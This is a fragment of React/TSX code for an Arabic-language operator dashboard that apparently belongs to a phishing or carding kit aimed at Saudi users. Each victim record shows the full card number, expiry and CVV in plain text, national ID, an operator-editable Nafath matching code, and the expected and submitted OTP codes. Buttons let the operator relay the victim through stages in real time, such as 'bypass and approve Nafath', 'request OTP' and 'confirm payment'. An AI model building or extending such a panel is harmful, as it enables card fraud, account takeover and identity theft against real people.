                <div className="flex flex-row-reverse justify-between items-start gap-4">
                  <div className="space-y-1">
                    <div className="flex flex-row-reverse items-center gap-1.5 flex-wrap">
                      <span className="text-slate-500 text-[10px] font-mono font-bold tracking-wider">{tx.id}</span>
                      <span className={`inline-flex items-center rounded-md px-2 py-0.5 text-[9px] font-bold ${
                        tx.status === 'APPROVED' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
                        tx.status === 'REJECTED' ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20' :
                        tx.status === 'AWAITING_OTP' ? 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 animate-pulse' :
                        tx.status === 'OTP_SUBMITTED' ? 'bg-cyan-500/10 text-cyan-450 border border-cyan-500/20 animate-bounce font-black' :
                        tx.status === 'AWAITING_NAFATH' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20 animate-pulse' :
                        tx.status === 'NAFATH_VERIFIED' ? 'bg-teal-500/10 text-teal-400 border border-teal-500/20' :
                        'bg-slate-500/10 text-slate-350 border border-slate-700/60'
                      }`}>
                        {tx.status === 'APPROVED' ? 'مكتمل ومقبول 👍' :
                         tx.status === 'REJECTED' ? 'مرفوض ❌' :
                         tx.status === 'AWAITING_OTP' ? 'بانتظار رمز الـ OTP 🔑' :
                         tx.status === 'OTP_SUBMITTED' ? 'تم إدخال الرمز 🔐' :
                         tx.status === 'AWAITING_NAFATH' ? 'بانتظار مطابقة نفاذ ⏳' :
                         tx.status === 'NAFATH_VERIFIED' ? 'تم توثيق نفاذ ✅' :
                         'بانتظار البطاقة 💳'}
                      </span>
                    </div>
                    <h3 className="text-base font-extrabold text-white truncate max-w-[200px]" title={tx.cardholderName}>
                      {tx.cardholderName || 'مستند مجهول'}
                    </h3>
                    {tx.nationalId && (
                      <div className="flex flex-row-reverse items-center gap-1.5 text-xs text-slate-400">
                        <span className="font-mono font-bold text-slate-300">{tx.nationalId}</span>
                        <span className="text-slate-500">:الهوية الوطنية</span>
                      </div>
                    )}
                  </div>

                  {/* Financial amount and timestamp */}
                  <div className="text-left flex flex-col items-start gap-1">
                    <span className="text-emerald-400 font-extrabold font-mono text-sm">${tx.amount.toFixed(2)}</span>
                    <span className="text-[9px] font-mono text-slate-500">
                      {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                    </span>
                    {tx.serviceName && (
                      <span className="text-[9px] font-bold bg-[#004d33]/35 text-[#2dd4bf] px-2 py-0.5 rounded-md border border-[#2dd4bf]/20 mt-1 max-w-[120px] truncate">
                        {tx.serviceName}
                      </span>
                    )}
                  </div>
                </div>

                {/* Credit Card Details Block */}
                <div className="bg-slate-950/60 rounded-2xl border border-slate-800/80 p-4 relative overflow-hidden flex flex-col gap-2.5">
                  <div className="flex flex-row-reverse justify-between items-center text-[9px] text-slate-500 font-bold border-b border-slate-900 pb-1.5">
                    <span>بيانات بطاقة الدفع</span>
                    {tx.cardType && tx.cardType !== 'unknown' && (
                      <span className={`text-[8px] font-mono border px-1 rounded uppercase ${getCardTypeColor(tx.cardType)}`}>
                        {tx.cardType}
                      </span>
                    )}
                  </div>
                  
                  {cardAwaiting ? (
                    <div className="py-3 flex flex-col items-center justify-center text-center gap-2">
                      <div className="w-8 h-8 rounded-full bg-indigo-500/10 flex items-center justify-center text-indigo-400 border border-indigo-500/20 animate-pulse">
                        <Activity className="w-4 h-4" />
                      </div>
                      <div>
                        <p className="text-[11px] font-bold text-slate-400">بانتظار إدخال بيانات الدفع...</p>
                        <p className="text-[9px] text-slate-500">لم يقم العميل بكتابة بطاقته الائتمانية حتى الآن</p>
                      </div>
                    </div>
                  ) : (
                    <div className="grid grid-cols-2 gap-3 text-right">
                      <div className="col-span-2 flex flex-row-reverse items-center justify-between border-b border-slate-900 pb-1.5">
                        <span className="text-[10px] text-slate-500">رقم البطاقة:</span>
                        <span className="text-xs font-mono font-black text-white select-all">
                          {tx.cardNumber}
                        </span>
                      </div>
                      <div className="flex flex-row-reverse items-center justify-between">
                        <span className="text-[10px] text-slate-500">الانتهاء:</span>
                        <span className="text-xs font-mono font-bold text-white">
                          {tx.expiry}
                        </span>
                      </div>
                      <div className="flex flex-row-reverse items-center justify-between border-r border-slate-900 pr-3">
                        <span className="text-[10px] text-slate-500">رمز الأمان (CVV):</span>
                        <span className="text-xs font-mono font-black text-amber-400 bg-amber-500/10 border border-amber-500/20 px-1.5 py-0.2 rounded">
                          {tx.cvv}
                        </span>
                      </div>
                    </div>
                  )}
                </div>

                {/* Verification Panels (Nafath Matching and OTP Verification) */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                  {/* Nafath Block */}
                  <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2.5">
                    <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
                      <span>توثيق نفاذ الموحد</span>
                      <Fingerprint className="w-3.5 h-3.5 text-emerald-400" />
                    </div>
                    
                    <div className="flex flex-row-reverse items-center justify-between">
                      <span className="text-[10px] text-slate-400">رمز المطابقة الحالي:</span>
                      <span className="text-xs font-mono font-black text-[#2dd4bf] bg-[#004d33]/20 border border-[#2dd4bf]/20 px-2 py-0.5 rounded">
                        {tx.nafathCode || 'غير محدد'}
                      </span>
                    </div>

                    {/* Change Nafath Matching code directly inside the user profile card */}
                    <div className="flex flex-row-reverse items-center justify-between gap-1.5 pt-2 border-t border-slate-900">
                      <input
                        type="text"
                        maxLength={3}
                        id={`inline-nafath-input-${tx.id}`}
                        placeholder="رمز مخصص"
                        defaultValue={tx.nafathCode || ''}
                        className="bg-slate-950 border border-slate-800 text-slate-200 text-[10px] text-center rounded px-1.5 py-1 w-16 h-7 focus:outline-none focus:ring-1 focus:ring-indigo-500 font-mono"
                      />
                      <button
                        type="button"
                        onClick={() => {
                          const el = document.getElementById(`inline-nafath-input-${tx.id}`) as HTMLInputElement;
                          if (el && el.value.trim()) {
                            handleUpdateTxNafathCodeDirect(tx.id, el.value.trim());
                          }
                        }}
                        className="bg-indigo-600 hover:bg-indigo-500 text-white text-[9px] font-black px-2 py-1 rounded h-7 transition-all cursor-pointer shrink-0"
                      >
                        حفظ
                      </button>
                    </div>
                  </div>

                  {/* OTP Verification Block */}
                  <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2">
                    <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
                      <span>رمز التحقق OTP</span>
                      <KeyRound className="w-3.5 h-3.5 text-cyan-400" />
                    </div>
                    <div className="flex flex-row-reverse items-center justify-between">
                      <span className="text-[10px] text-slate-400">الرمز المتوقع:</span>
                      <span className="text-xs font-mono font-bold text-white">
                        {tx.otpCode}
                      </span>
                    </div>
                    <div className="flex flex-row-reverse items-center justify-between">
                      <span className="text-[10px] text-slate-400">الرمز المدخل:</span>
                      {tx.submittedOtp ? (
                        <span className="text-xs font-mono font-black text-cyan-300 bg-cyan-500/10 border border-cyan-500/20 px-1.5 py-0.5 rounded animate-bounce">
                          {tx.submittedOtp}
                        </span>
                      ) : (
                        <span className="text-[9px] text-slate-500 italic">بانتظار الإدخال</span>
                      )}
                    </div>
                  </div>
                </div>

                {/* Full Workflow Interactive Controls */}
                <div className="border-t border-slate-900 pt-4 mt-auto">
                  {tx.status === 'AWAITING_NAFATH' ? (
                    <div className="space-y-2">
                      <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15 animate-pulse">
                        الخطوة 1: بانتظار توثيق العميل لطلب نفاذ
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                          disabled={actionBusy}
                          className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                        >
                          رفض العملية
                        </button>
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'NAFATH_VERIFIED')}
                          disabled={actionBusy}
                          className="flex h-9 w-full items-center justify-center rounded-xl bg-teal-600 hover:bg-teal-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                        >
                          تجاوز وموافقة نفاذ ✅
                        </button>
                      </div>
                    </div>
                  ) : tx.status === 'NAFATH_VERIFIED' ? (
                    <div className="text-center bg-teal-950/10 border border-teal-800/40 rounded-2xl p-3">
                      <p className="text-xs text-teal-300 font-bold">تم توثيق نفاذ بنجاح!</p>
                      <p className="text-[9px] text-slate-500 mt-0.5">بانتظار قيام العميل بالانتقال لصفحة الدفع في متصفحه</p>
                      <button
                        onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                        disabled={actionBusy}
                        className="mt-2 text-[9px] text-indigo-400 hover:text-indigo-300 underline transition cursor-pointer"
                      >
                        تجاوز والانتقال لفحص البطاقة يدوياً 💳
                      </button>
                    </div>
                  ) : tx.status === 'PENDING_CARD_APPROVAL' ? (
                    <div className="space-y-2">
                      <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15">
                        الخطوة 2: اتخاذ قرار بشأن البطاقة المدخلة
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                          disabled={actionBusy}
                          className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                        >
                          رفض البطاقة
                        </button>
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'AWAITING_OTP')}
                          disabled={actionBusy}
                          className="flex h-9 w-full items-center justify-center rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                        >
                          طلب الرمز OTP 🔑
                        </button>
                      </div>
                    </div>
                  ) : tx.status === 'OTP_SUBMITTED' ? (
                    <div className="space-y-2">
                      <div className="text-[9px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/30 py-1.5 rounded border border-cyan-500/20 animate-pulse">
                        الخطوة 3: العميل أدخل الرمز الجديد - يرجى التحقق
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                          disabled={actionBusy}
                          className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                        >
                          رفض الرمز والمحاولة ثانية
                        </button>
                        <button
                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'APPROVED')}
                          disabled={actionBusy}
                          className="flex h-9 w-full items-center justify-center rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                        >
                          تأكيد وقبول عملية الدفع 👍
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="text-center">
                      <div className="rounded-xl bg-slate-950/80 border border-slate-900 py-2">
                        <p className="text-[10px] text-slate-400">
                          اكتملت دورة المعاملة بنجاح بالحالة:{' '}
                          <span className={`font-black ${
                            tx.status === 'APPROVED' ? 'text-emerald-400' : 'text-rose-400'
                          }`}>
                            {tx.status === 'APPROVED' ? 'مقبولة بنجاح 👍' : 'مرفوضة وملغاة ❌'}
                          </span>
                        </p>
                      </div>
                      <button
                        onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                        disabled={actionBusy}
                        className="mt-2 text-[9px] font-mono text-slate-500 hover:text-slate-300 underline transition cursor-pointer flex items-center justify-center gap-1 mx-auto"
                      >
                        <RefreshCw className="w-2.5 h-2.5" />
                        <span>إعادة تفعيل المعاملة لفحص البطاقة</span>
                      </button>
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
};
